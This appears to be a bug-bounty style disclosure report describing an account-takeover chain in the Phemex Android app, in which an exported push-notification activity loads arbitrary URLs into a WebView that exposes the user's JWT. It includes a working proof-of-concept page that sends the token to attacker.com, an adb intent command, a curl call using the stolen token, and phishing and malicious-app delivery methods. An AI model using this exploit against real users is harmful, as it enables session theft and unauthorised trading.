@@ -1,0 +1,137 @@
+Phemex Android APK - Complete Account Takeover Vulnerability
+
+================================================================================
+VULNERABILITY DETAILS
+================================================================================
+
+During a manual review of the Phemex APK, I identified a complete account
+takeover chain requiring a single tap from the victim. The root of the issue is
+FirebasePushClickActivity, an exported component with no permission guard, which
+accepts an arbitrary URL via its routerUrl intent extra and forwards it directly
+to an internal WebView bypassing all existing schema and host validation present
+in GuideActivity and DeepLinkActivity. The loaded page has immediate access to a
+registered Bridge JavaScript interface, which on postMessage('getAppInfo')
+synchronously returns the user's live JWT session token and device identifiers
+to any origin. I confirmed this chain end-to-end against my own account: the
+token was captured, decoded, and used to make authenticated requests to
+api.phemex.com.
+
+What Makes This Different From a Generic WebView Bug
+----------------------------------------------------
+The deep link validators in GuideActivity and DeepLinkActivity explicitly reject
+http:// and https:// schemas - this is intentional hardening. The bypass only
+exists because FirebasePushClickActivity was designed to handle FCM push payloads
+and routes its routerUrl extra through jumpInnerPage/jumpPushPage without going
+through the same validation gate. The Bridge then trusts whatever origin the
+WebView loaded. These three flaws in isolation are low-medium risk. Together
+they're a complete ATO primitive reachable from a single intent.
+
+Root Cause
+----------
+FirebasePushClickActivity is declared exported in AndroidManifest.xml with no
+android:permission attribute. It reads the routerUrl string extra from the
+incoming intent and passes it without domain or schema validation to the
+internal routing layer, which opens a WebViewActivity. The PhemexWebView class
+calls addJavascriptInterface(new Bridge(this), "Bridge") unconditionally -
+meaning the Bridge is active regardless of what URL is loaded. The getAppInfo
+command handler retrieves the current session context (JWT, UDID, session UUID)
+and returns it to the page's registered global callback.
+
+Impact
+------
+A remote attacker who delivers this payload obtains a valid, unexpired JWT
+scoped to the victim's Phemex session. With it they can:
+
+- Read full account balances and trade history
+- Place and cancel orders
+- Initiate withdrawals (subject to 2FA on withdrawal - worth noting this
+  partially limits fund loss but does not limit information access or trading
+  manipulation)
+- Access Web3 wallet metadata and linked addresses
+
+Every logged-in Phemex Android user can be affected.
+
+================================================================================
+VALIDATION STEPS
+================================================================================
+
+Steps to Reproduce
+------------------
+
+1. Host the PoC page
+
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+window.getAppInfo = function(data) {
+  fetch('https://attacker.com/collect?d=' + btoa(data));
+};
+if (window.Bridge) {
+  Bridge.postMessage('getAppInfo');
+}
+</script>
+</head>
+<body>Loading...</body>
+</html>
+
+
+2. Fire the intent (simulates attacker-controlled FCM payload or phishing link)
+
+adb shell am start \
+  -n com.phemex.app/com.phemex.app.third.firebase.FirebasePushClickActivity \
+  --es routerUrl https://attacker.com/poc.html
+
+
+3. Observe capture on attacker server
+
+The server receives a GET request containing a base64-encoded JSON blob. Decoded:
+
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
+  "bid": "626e6361-3663-3837-2d33-316239323766",
+  "version": "5.7.0",
+  "platform": "Android"
+}
+
+
+4. Decode the JWT
+
+iss: PHEMEX
+subj: 8862377
+exp: 1772151148  ← valid at time of capture
+
+
+5. Use token against live API
+
+curl -s https://api.phemex.com/accounts/accountPositions \
+  -H "phemex-auth-token: <STOLEN_TOKEN>" \
+  -H "x-phemex-device: Android" \
+  -H "User-Agent: PhemexApp Android 5.7.0 626e6361-3663-3837-2d33-316239323766"
+
+Response returned authenticated account data for userId: 8862377.
+
+
+Real-World Delivery
+-------------------
+No exotic access is needed to trigger this against a real victim:
+
+- Phishing link: A standard http:// URL hosted anywhere that redirects to an
+  intent URI opens this via Chrome's intent scheme handling on unpatched Android
+  versions
+
+- Malicious co-installed app: Any app on the device can fire this intent
+  directly with zero permissions required since the activity is exported with no
+  guard
+
+- Spoofed FCM payload: Since this activity was built to handle push
+  notifications, a server-side attacker with FCM access (or a rogue app
+  registering a similar FCM sender) can deliver the routerUrl payload through
+  the notification channel the activity was designed for
+
+The victim never sees a prompt. The WebView opens, the script runs, and the
+token is gone in under a second.
+
+================================================================================
+END OF REPORT
+================================================================================
